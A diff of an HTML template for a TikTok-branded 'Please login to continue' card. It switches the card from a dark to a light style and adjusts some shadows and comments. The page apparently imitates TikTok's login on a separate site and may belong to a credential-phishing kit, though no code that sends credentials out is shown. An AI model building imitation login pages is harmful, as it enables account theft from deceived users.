@@ -1,13 +1,13 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card" style="max-width:520px;margin:28px auto;background:#000;">
+<div class="card" style="max-width:520px;margin:28px auto">
   <div class="platform-header">
     <div class="icon-circle bg-tiktok">
       <i class="fa-brands fa-tiktok icon-lg"></i>
     </div>
     <div>
-      <h2 class="notranslate" style="margin:0;color:#fff;">TikTok</h2>
-      <div style="color:#aaa;font-size:13px">Please login to continue</div>
+      <h2 class="notranslate" style="margin:0;color:#000;">TikTok</h2>
+      <div style="color:#64748b;font-size:13px">Please login to continue</div>
     </div>
   </div>
 
@@ -23,29 +23,18 @@
 </div>
 
 <style>
-.card {
-  border-radius: 20px;
-  box-shadow: 0 8px 20px rgba(0,0,0,0.4);
-  padding: 28px;
-}
-
 .input {
   width: 100%;
   padding: 14px;
-  border-radius: 20px;
-  border: 1px solid #333;
-  background: #111;
-  color: #fff;
+  border-radius: 18px;
+  border: 1px solid #e5e7eb;
   margin-bottom: 8px;
   font-size: 16px;
   transition: border-color 0.2s, box-shadow 0.2s;
 }
-.input::placeholder {
-  color: #aaa;
-}
 .input:focus {
   border-color: #ff0050;
-  box-shadow: 0 0 0 3px rgba(255, 0, 80, 0.25);
+  box-shadow: 0 0 0 3px rgba(255, 0, 80, 0.2);
   outline: none;
 }
 .input-error {
@@ -59,7 +48,6 @@
   margin-bottom: 8px;
 }
 
-/* TikTok Login Button */
 .login-btn {
   width: 100%;
   background: #ff0050;
@@ -71,7 +59,7 @@
   cursor: pointer;
   border: none;
   transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
-  box-shadow: 0 6px 16px rgba(255, 0, 80, 0.3);
+  box-shadow: 0 6px 16px rgba(255, 0, 80, 0.25);
   display: block;
   margin-top: 8px;
 }
@@ -90,6 +78,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
   const addressError = document.getElementById("addressError");
   const passwordError = document.getElementById("passwordError");
 
+  // Validation patterns
   const emailPattern = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.(com|net|org|co|io|me|info|biz)$/;
   const phonePattern = /^\+?\d{6,}$/;
 
